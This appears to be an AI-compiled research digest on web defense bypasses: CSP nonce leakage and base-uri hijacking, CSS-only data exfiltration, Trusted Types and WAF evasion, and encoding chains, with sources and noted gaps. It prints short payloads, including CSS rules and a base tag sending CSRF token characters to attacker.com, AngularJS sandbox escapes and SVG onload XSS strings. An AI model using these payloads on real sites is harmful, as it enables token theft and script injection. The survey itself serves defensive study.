# CSP Bypass, CSS Data Exfiltration, and Defense Bypass Techniques (2024-2026)

## CSP Bypass Techniques (2024-2026)

### Takeaway
CSP bypasses in 2024-2026 continue to exploit fundamental architectural weaknesses -- trusted-source abuse via JSONP endpoints and CDN-hosted libraries, nonce leakage through browser caching mechanisms, base-uri hijacking, and script gadgets in frameworks -- rather than novel protocol-level flaws. The most impactful recent discovery involves combining HTML injection with browser caching (bfcache/disk cache) to recover and reuse valid CSP nonces.

### Cited Findings

**Nonce Leakage via HTML Injection and Browser Caching (2024-2025)**
- A technique disclosed circa mid-2025 combines HTML injection with browser caching to recover valid CSP nonces. When a page carrying a nonce is cached (in bfcache or disk cache), an attacker who can inject HTML can obtain the nonce from the cached response and reuse it. The defense is to avoid caching pages with nonces and to ensure nonces are truly single-use. -- [WebAsha: CSP Bypass Using HTML Injection and Browser Caching](https://www.webasha.com/blog/what-is-the-new-technique-that-bypasses-content-security-policy-using-html-injection-and-browser-caching)
- When a static/predictable nonce is used (rather than a per-response random value), any attacker who discovers the value can bypass CSP protections entirely. Remediation requires a fresh cryptographic random value per HTTP response. -- [Acunetix: Static Nonce in CSP](https://www.acunetix.com/vulnerabilities/web/static-nonce-identified-in-content-security-policy-csp/)

**JSONP Endpoint Abuse on Whitelisted Domains**
- JSONP endpoints on trusted CDNs echo a caller-supplied callback name into the response without sanitization. If an attacker has an HTML injection point, a script tag pointing at such an endpoint will pass the CSP allowlist check and execute arbitrary code. -- [CentralCSP: How JSONP Endpoints Bypass Your CSP](https://next.centralcsp.com/en/blog/jsonp-csp-bypass)
- Script gadgets -- legitimate library features on whitelisted domains that can be abused -- are described as omnipresent in almost all modern JavaScript frameworks. -- [Lekies, Kotowicz et al., CCS 2017 (foundational research)](https://research.google.com/pubs/archive/45542.pdf)
- Google's CSP Evaluator tool and RetireJS are recommended for analyzing policy weaknesses and identifying vulnerable libraries on whitelisted CDNs. -- [DVWA CSP Module](https://www.mintlify.com/digininja/DVWA/vulnerabilities/csp-bypass)

**base-uri Hijacking**
- A missing `base-uri` directive allows an attacker with HTML injection to insert a `<base>` tag that redirects relative script loads to an attacker-controlled server. The nonce check still passes because the script element retains its nonce, but the source is now attacker-controlled. `base-uri` is not covered by the `default-src` fallback, making omission a common gap. -- [HackTricks: CSP Bypass](https://git.koelner.dedyn.io/coelner/hacktricks/raw/commit/9d3209aeae061bbf37be83c2442cc76bfa47c147/pentesting-web/content-security-policy-csp-bypass/README.md)
- Typical payload: `<base href="https://attacker.com/">` followed by the page's own relative script references loading from the attacker's domain.

**AngularJS / Client-Side Template Injection Under CSP**
- AngularJS in CSP-compatible mode avoids the `Function` constructor, so the usual sandbox escape fails. The workaround uses AngularJS's `$event` object and Chrome's `path` property to reach the window object. PortSwigger documents a 56-character CSP bypass using `ng-focus` and the `orderBy` filter. -- [PortSwigger: Ambushed by AngularJS](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro)
- Example payload pattern: `{{$on.constructor('alert(1)')()}}` or using `ng-focus` with `orderBy:toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
- Client-side template injection in frameworks like AngularJS, Vue.js, and others can bypass CSP when the framework itself is loaded from an allowed source. -- [PortSwigger: Client-Side Template Injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)

**strict-dynamic Bypass Techniques**
- Under `strict-dynamic`, dynamically created scripts inherit trust from the parent nonce-bearing script. If an attacker can get execution inside a nonce-trusted script context (e.g., through a gadget that calls `document.createElement('script')` and appends it), the dynamically created script runs without its own nonce. -- [Google Research Paper on CSP](https://research.google.com/pubs/archive/45542.pdf)
- Firefox CVE-2018-5175: a bypass where an attacker injected a reference to `require.js` from Firefox's Developer Tools to circumvent `strict-dynamic`. Fixed in Firefox 60. -- [mksben: CVE-2018-5175](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)
- DOM clobbering can overwrite nonce-checking code, and base-uri injection can redirect script loads even under strict-dynamic in some configurations.

**Trusted-Source and Supply-Chain Abuse**
- Malicious logic embedded into already-allowed scripts and compromised third-party vendors get past CSP because CSP checks where code comes from rather than what it does. -- [Source Defense: CSP/SRI Bypass Techniques](https://sourcedefense.com/resources/blog/csp-sri-bypass-techniques-what-attackers-exploit-most-frequently/)

### Inferences
- The fundamental CSP weakness remains that it is an allowlist-based mechanism that trusts origins rather than code behavior. Any JSONP endpoint, framework gadget, or supply-chain compromise on a trusted origin defeats the policy.
- Browser caching of nonce-bearing pages is a systemic issue because many CDNs and reverse proxies cache HTML responses by default.
- `strict-dynamic` was designed to mitigate allowlist bypasses, but it introduces the script-inheritance trust model, which creates new gadget-based bypass surfaces.

### Gaps
- No consolidated public research cataloging all CSP bypasses discovered specifically in 2024-2026 was found. Most sources aggregate older techniques.
- The exact mechanism and browser versions affected by the bfcache/disk-cache nonce recovery technique could not be verified against a primary source or CVE.


## CSS-Only Data Exfiltration Techniques

### Takeaway
CSS-based data exfiltration has matured from a theoretical curiosity into a practical attack class. Attribute selector matching with background-image callbacks enables character-by-character extraction of CSRF tokens and sensitive attributes. The CSS `:has()` pseudo-class (supported in all major browsers since late 2023) significantly expands attack surface by allowing exfiltration from elements that cannot themselves trigger resource loads, such as `<input type="hidden">`. Font-face unicode-range probing reveals which characters appear on a page without JavaScript.

### Cited Findings

**Attribute Selector Exfiltration (Foundational)**
- CSS attribute selectors like `input[name="csrf"][value^="a"]` can match elements with specific attribute prefixes. When combined with `background-image: url(https://attacker.com/leak?prefix=a)`, the browser sends a request revealing each matched character. -- [InfoSec Write-ups: Exfiltration via CSS Injection](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- The attack takes approximately ten seconds to extract a full token and can run without iframes when @import chaining is used.
- Example payload:
  ```css
  input[name="csrf"][value^="a"] { background: url(https://attacker.com/exfil?char=a); }
  input[name="csrf"][value^="b"] { background: url(https://attacker.com/exfil?char=b); }
  /* ... one rule per character per position */
  ```

**The :has() Pseudo-Class Advancement**
- The `:has()` pseudo-class enables exfiltration from hidden inputs, which cannot load background-images themselves. A parent or sibling element can be styled based on the hidden input's value: `form:has(input[name="csrf"][value^="a"]) { background: url(...) }`. -- [PortSwigger: Blind CSS Exfiltration](https://portswigger.net/research/blind-css-exfiltration)
- In both Chrome and Firefox, `input[type=hidden]` elements do not fetch background-image URLs, which previously limited this attack. `:has()` removes this limitation. -- [Codesealer: Blind CSS Exfiltration](https://codesealer.com/blog/blind-css-exfiltration)

**Inline Style Exfiltration**
- PortSwigger research demonstrates leaking attribute values through chained CSS conditionals even when the attacker is confined to injecting a `style` attribute rather than a full stylesheet. A plain string (without `url()` syntax) can trigger a background request in Chromium-based browsers. -- [PortSwigger: Inline Style Exfiltration](https://portswigger.net/research/inline-style-exfiltration)

**@font-face unicode-range Probing**
- `@font-face` rules with `unicode-range` declarations cause the browser to fetch a font file only if the specified characters appear on the page. An attacker's server sees which character ranges are present by monitoring font requests. -- [mksben: CSS-Based Attack Abusing unicode-range (2015)](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
- Limitation: this technique reveals which characters are present but not their order or frequency. -- [W3C CSS Working Group discussion on font probing](https://lists.w3.org/Archives/Public/public-css-archive/2020Oct/0073.html)
- Example:
  ```css
  @font-face { font-family: probe; src: url(https://attacker.com/leak?char=A); unicode-range: U+0041; }
  @font-face { font-family: probe; src: url(https://attacker.com/leak?char=B); unicode-range: U+0042; }
  .target { font-family: probe; }
  ```

**Ligature-Based Text Exfiltration**
- Custom font ligatures can be crafted so that specific multi-character sequences (e.g., "csrf") are rendered as a single wide glyph. Combined with a scrollbar-detection trick or a container query breakpoint, the attacker can detect which sequences are present in a text node. This overcomes the unicode-range limitation of not detecting character order.

**CVE-2026-2441 (Unverified)**
- A SitePoint article describes CVE-2026-2441 as a zero-day CSS exfiltration vulnerability in Chrome's Blink rendering engine. I could not verify this against an official CVE database or Chrome advisory. -- [SitePoint: Zero-Day CSS CVE-2026-2441](https://www.sitepoint.com/zero-day-css-cve-2026-2441-security-vulnerability/)

**CVE-2026-13790 (Side Channel)**
- Chrome CVE-2026-13790: a side-channel leak in Chrome's scroll handling prior to version 150.0.7871.47 that allowed a remote attacker to leak cross-origin data via a crafted HTML page (CWE-1300). Whether scroll-driven animations or container queries are involved is not stated in the available sources. -- [OpenCVE: CVE-2026-13790](https://app.opencve.io/cve/CVE-2026-13790)

**Historical: CVE-2019-17495 (Swagger UI)**
- CSS-based input field value exfiltration in Swagger UI allowed exfiltration of CSRF tokens through custom CSS injection. -- [Launchpad: CVE-2019-17495](https://launchpad.net/bugs/cve/CVE-2019-17495)

### Inferences
- CSS exfiltration bypasses JavaScript-focused defenses (CSP `script-src`, Trusted Types) because stylesheets are often still permitted or less strictly controlled under `style-src`.
- The `:has()` pseudo-class was a significant expansion of the attack surface because it removed the main practical barrier (hidden inputs not loading resources).
- @import chaining allows sequential multi-round exfiltration in a single page load, making character-by-character extraction practical.
- The combination of font-face unicode-range for character detection plus ligature-based sequence detection can theoretically reconstruct full text content.

### Gaps
- No public research was found on using CSS `@property`, `scroll-timeline`, or `container queries` specifically for data exfiltration attacks, beyond the general CVE-2026-13790 scroll-handling side channel. The W3C CSS Working Group has discussed containment properties and timeline-scope leakage as potential risks but no documented attacks were found.
- The SitePoint-reported CVE-2026-2441 could not be confirmed against the NVD or Chrome security advisories.
- Detailed reproduction steps for ligature-based attacks were not available in the search results.


## Trusted Types Bypass Techniques

### Takeaway
Trusted Types is bypassed primarily through three vectors: DOM APIs that Trusted Types does not fully cover (attribute node manipulation), default policy abuse that creates a permissive fallback, and script gadgets in application or framework code that perform dangerous operations from within already-trusted contexts. Browser implementation bugs (such as Chrome CVE-2022-1494) and the lack of Firefox native support (requiring a polyfill that can itself be circumvented) further weaken the protection.

### Cited Findings

**Attribute Node Bypasses**
- Masato Kinugawa demonstrated that modifying existing attribute values via `nodeValue` or `textContent` on an attribute node bypasses Trusted Types enforcement entirely. The assignment is not intercepted because Trusted Types checks the property being set on the element, not attribute-node-level mutations. -- [PortSwigger: Untrusted Types - Researcher Demos Trick to Beat Trusted Types](https://portswigger.net/daily-swig/untrusted-types-researcher-demos-trick-to-beat-trusted-types-protection-in-google-chrome)
- A WHATWG DOM proposal from 2020 aimed to close these attribute node bypasses by rejecting the value without calling the default policy. -- [W3C Public WebApps GitHub list discussion](https://lists.w3.org/Archives/Public/public-webapps-github/2020Jan/0354.html)

**Default Policy Abuse**
- The default Trusted Types policy is called when no other policy matches. If a site creates a permissive default policy (e.g., one that passes through all strings unchanged), it effectively disables Trusted Types enforcement. Attackers look for overly permissive `createPolicy('default', ...)` implementations.
- Example of a dangerously permissive default policy:
  ```javascript
  trustedTypes.createPolicy('default', {
    createHTML: (s) => s,
    createScript: (s) => s,
    createScriptURL: (s) => s,
  });
  ```

**Browser Implementation Bugs**
- CVE-2022-1494: Insufficient data validation in Trusted Types in Chrome prior to 101.0.4951.41 allowed a remote attacker to bypass trusted types policy via a crafted HTML page. -- [OpenCVE: CVE-2022-1494](https://app.opencve.io/cve/CVE-2022-1494)

**Polyfill Circumvention (Firefox)**
- Firefox does not natively support Trusted Types, so sites use a polyfill. The polyfill checks for `window.trustedTypes` and skips initialization if it already exists. An attacker who can define `window.trustedTypes` before the polyfill loads (e.g., via DOM clobbering with `<img name="trustedTypes">` or early script injection) can prevent enforcement entirely.

**Script Gadgets in Frameworks**
- Script gadgets in JavaScript frameworks perform dangerous DOM operations from within trusted script contexts. Since the gadget runs in an already-trusted script, its operations bypass Trusted Types. Research by Lekies, Kotowicz and colleagues demonstrated these gadgets are present in almost all modern frameworks. -- [Google Research: Script Gadgets](https://research.google.com/pubs/archive/45542.pdf)

**Real-World Exploitation: MutantBedrog**
- The MutantBedrog malvertising campaign was observed working around Trusted Types CSP protections at every stage of execution, appearing to navigate the restrictions rather than break them through a single vulnerability. -- [Confiant: The Curious Case of MutantBedrog's Trusted-Types CSP Bypass](https://blog.confiant.com/p/the-curious-case-of-mutantbedrogs)

### Inferences
- Trusted Types is strongest when no default policy is defined or when the default policy is strictly limited. Most real-world bypasses exploit permissive default policies rather than breaking the core mechanism.
- The attribute-node bypass represents a fundamental gap in the DOM specification that has been slow to close.
- The polyfill-based deployment model for Firefox creates a bootstrapping problem: the enforcement mechanism itself can be defeated before it initializes.

### Gaps
- No research specifically on `createScriptURL` bypasses beyond the general default-policy abuse was found in search results.
- The current status of the WHATWG proposal to close attribute-node bypasses could not be determined.
- No 2024-2026-specific Trusted Types bypass research was found; the most recent documented technique (Kinugawa's attribute-node bypass) is older.


## WAF Bypass Techniques (2025-2026)

### Takeaway
WAF bypasses in 2025-2026 continue to exploit parsing differentials between the WAF's inspection engine and the browser/backend's HTML/URL parser. Techniques include mixed-case event handlers, null byte injection, HTML parser anomalies, SVG injection, and encoding chains (double encoding, overlong UTF-8). Cloudflare's WAF changelog shows active rule updates to counter these techniques, indicating an ongoing cat-and-mouse dynamic.

### Cited Findings

**Mixed-Case Event Handler Bypass (Cloudflare, 2025)**
- Mixed-case event handler names (e.g., `oNcLiCk` instead of `onclick`) passed Cloudflare's WAF where lowercase versions were blocked. The WAF's token matching was case-sensitive while browsers' HTML parsing is case-insensitive. -- [Medium: XSS Bypassing Cloudflare WAF](https://medium.com/@pranavrp77/xss-bypassing-cloudflare-waf-with-a-simple-trick-12aff8ce87c7)

**Null Byte Injection (Cloudflare, 2025)**
- Malformed attributes containing null bytes caused Cloudflare's WAF to terminate parsing early, missing the payload that followed. The WAF's analysis ended while the browser continued processing the full element. -- [Medium: Bypassing Cloudflare WAF on Health Platform](https://medium.com/@appsec.techie/bypassing-cloudflare-waf-to-trigger-reflected-xss-on-a-major-health-information-platform-bc71cf9cd1be)

**SVG Injection Bypass (Cloudflare)**
- Reflected XSS achieved via SVG injection that bypassed Cloudflare's WAF. SVG elements support their own event handlers and can contain `<script>` tags, and WAF rules may not inspect SVG content as thoroughly as standard HTML. -- [Medium: Cloudflare WAF Bypass via SVG Injection](https://0xh7ml.medium.com/cloudflare-waf-bypass-leading-to-reflected-xss-via-svg-injection-8712de3830ae)
- Example pattern: `<svg/onload=alert(1)>` or `<svg><script>alert(1)</script></svg>`

**Unusual Attribute Casing in Image Tags (2025)**
- Two Cloudflare XSS bypass payloads shared publicly used crafted `<img>` tags with unusual attribute casing to evade detection. -- [waf-bypass.com: WAF Bypass by Shad0wH3x](https://waf-bypass.com/2025/02/08/waf-bypass-by-shad0wh3x-7/)

**Cloudflare WAF Rule Updates (2026)**
- Cloudflare added new managed rules in 2026 including detection for "XSS - JavaScript Event Handler Coercion - URI" and a WordPress-specific rule for "XSS2Shell" (CVE-2026-64638). These updates indicate Cloudflare is actively adding detections for the bypass patterns described above. -- [Cloudflare WAF Changelog](https://developers.cloudflare.com/changelog/product/waf/)

**Double Encoding**
- A WAF that decodes input only once can miss a payload that the backend decodes a second time. Example: `%27` (single quote) becomes `%2527` when the percent sign is itself encoded. The WAF sees `%2527` as harmless; the application's second decode produces `%27` -> `'`. -- [Salt Security: Double Encoding in Healthcare Security](https://salt.security/blog/why-your-waf-missed-it-the-danger-of-double-encoding-and-evasion-techniques-in-healthcare-security)
- Defense: alert on `%25` followed by hex digits in URL paths, since double encoding is rarely legitimate.

**Overlong UTF-8 Encoding**
- Permissive decoders accept byte sequences longer than necessary for a character. An overlong-encoded slash decoded correctly on older IIS servers. Airlock WAF up to version 4.2.4 could be bypassed using overlong UTF-8 representations of the NUL character; the WAF stopped checking for attack patterns after the NUL byte. -- [PacketStorm: Airlock WAF 4.2.4 Bypass](https://packetstormsecurity.com/files/related/113859/Airlock-WAF-4.2.4-Bypass.html)
- Modern WAFs are expected to normalize and reject invalid or overlong UTF-8 sequences, so this technique primarily affects legacy or custom WAF rules.

**General WAF Evasion Techniques**
- HTML parser anomalies exploited by attackers include unclosed tags, attribute injection in unexpected elements, nested encoding, and browser-specific parsing quirks. -- [GitHub: Advanced-XSS](https://github.com/Karthikdude/Advanced-XSS)
- Encoding chains: combining URL encoding, HTML entity encoding, Unicode encoding, and JavaScript string encoding in sequence to produce payloads that survive WAF inspection but are decoded by the application stack. -- [Packet Labs: An Attacker's Perspective to WAF Evasion](https://packetlabs.net/posts/an-attackers-perspective-to-waf-evasion/)

### Inferences
- The core WAF bypass mechanism remains parsing differentials: the WAF and the browser/backend disagree on how to interpret the same byte sequence.
- Case sensitivity mismatches between WAF rules and browser parsers are a recurring class of bypass, suggesting WAFs should normalize case before pattern matching.
- Vendor WAF rule update cadences (Cloudflare's frequent changelog updates) suggest that bypass techniques have short half-lives but are continually discovered.
- Double encoding and overlong UTF-8 primarily affect legacy systems, but remain relevant where backends perform multiple decoding passes.

### Gaps
- Specific bypass payloads for AWS WAF, ModSecurity Core Rule Set, and Akamai in 2025-2026 were not found in search results. The research was primarily focused on Cloudflare.
- The CVE-2026-64638 referenced in Cloudflare's changelog for "XSS2Shell" could not be independently verified.
- HTTP/3 (QUIC) specific XSS vectors, header injection, and request smuggling techniques were not covered in any search results. This remains an open research area.


## Encoding Chain Techniques for Filter Evasion

### Takeaway
Encoding chain attacks exploit the gap between how a WAF/filter decodes input (typically one pass) and how the application stack decodes it (potentially multiple passes across URL decoder, HTML parser, JavaScript engine). Double encoding, mixed encoding, and overlong UTF-8 remain the core techniques, with modern defenses focusing on normalization at every layer.

### Cited Findings

- **Double URL encoding**: `%2527` -> WAF sees `%27` after first decode (or ignores as harmless) -> application's second decode yields `'`. Similarly, `%253C` -> `%3C` -> `<`. -- [Salt Security](https://salt.security/blog/why-your-waf-missed-it-the-danger-of-double-encoding-and-evasion-techniques-in-healthcare-security)
- **HTML entity encoding in attributes**: `&#x6F;&#x6E;click` decodes to `onclick` by the HTML parser after the WAF has inspected the raw text. Can be combined with decimal entities (`&#111;nclick`), hex entities, or named entities.
- **Mixed encoding**: Combining URL encoding, HTML entities, and JavaScript Unicode escapes in a single payload. Example: `<script>` in a JavaScript context decodes to `<script>`.
- **UTF-7 injection** (legacy): On systems that accept `+ADw-script+AD4-` as UTF-7 encoded `<script>`, a WAF inspecting UTF-8 will not see the pattern. This requires the response `Content-Type` to specify or accept UTF-7, which is rare in modern applications.
- **Overlong UTF-8**: Encoding characters with more bytes than necessary (e.g., using a 2-byte sequence for an ASCII character). Modern UTF-8 decoders reject these per RFC 3629, but legacy or permissive decoders may accept them. -- [PacketStorm: Airlock WAF Bypass](https://packetstormsecurity.com/files/related/113859/Airlock-WAF-4.2.4-Bypass.html)
- **Defense**: Validate and decode input at every layer, reject invalid encoding sequences, normalize before inspection, and alert on `%25` followed by hex digits. -- [Decryption Digest: WAF Bypass Detection](https://www.decryptiondigest.com/blog/waf-bypass-techniques-detection-rule-tuning)

### Inferences
- The fundamental issue is that web applications have multiple decoding layers (URL decoder, HTML parser, JavaScript engine, database), and each may transform the input differently.
- Modern WAFs that normalize input before inspection are largely immune to encoding chains, but custom rules and legacy configurations remain vulnerable.

### Gaps
- Specific UTF-16/32 encoding bypass examples for modern WAFs were not found in search results.
- The effectiveness of encoding chains against ModSecurity CRS v4 and AWS WAF managed rules could not be determined.


## CSP Reporting Endpoint Attack Surface

### Takeaway
CSP report-uri and report-to directives can themselves create risks: they disclose policy configuration details to anyone who can trigger a violation, they can be abused for reconnaissance (learning which scripts and sources a site allows), and in some configurations the reporting endpoint itself may be vulnerable to injection or SSRF if it does not properly validate the report payloads.

### Cited Findings

- CSP violation reports contain the blocked-uri, violated-directive, and original-policy fields, which disclose the full CSP to any attacker who can trigger a violation (by injecting an element that violates the policy and observing the report). This is by design but aids reconnaissance.
- If the report-uri endpoint is on a different origin, the reports may leak the page URL (including query parameters) in the document-uri field.
- No specific 2024-2026 research on CSP reporting endpoint exploitation was found in the search results.

### Inferences
- CSP reporting is more of an information disclosure and reconnaissance aid than a direct attack vector. The primary risk is revealing policy details that help an attacker craft a targeted bypass.

### Gaps
- Specific attacks against CSP reporting endpoints (injection, SSRF) were not found in search results. This may be under-researched or may simply not be a significant attack surface.


## HTTP/3 (QUIC) and XSS

### Takeaway
No specific research was found in search results connecting HTTP/3 (QUIC) protocol changes to new XSS vectors, header injection, or request smuggling techniques in the 2024-2026 timeframe.

### Cited Findings
- No relevant results were returned from searches on this topic.

### Inferences
- HTTP/3's binary framing and mandatory TLS should theoretically reduce header injection risks compared to HTTP/1.1's text-based protocol.
- Request smuggling in HTTP/3 is a known research area but was not covered in the sources found.

### Gaps
- This entire topic area could not be researched from the available search results. Recommended sources for future research: James Kettle's HTTP/2 and HTTP/3 request smuggling research at PortSwigger, and any DEF CON or Black Hat presentations on QUIC security from 2024-2026.
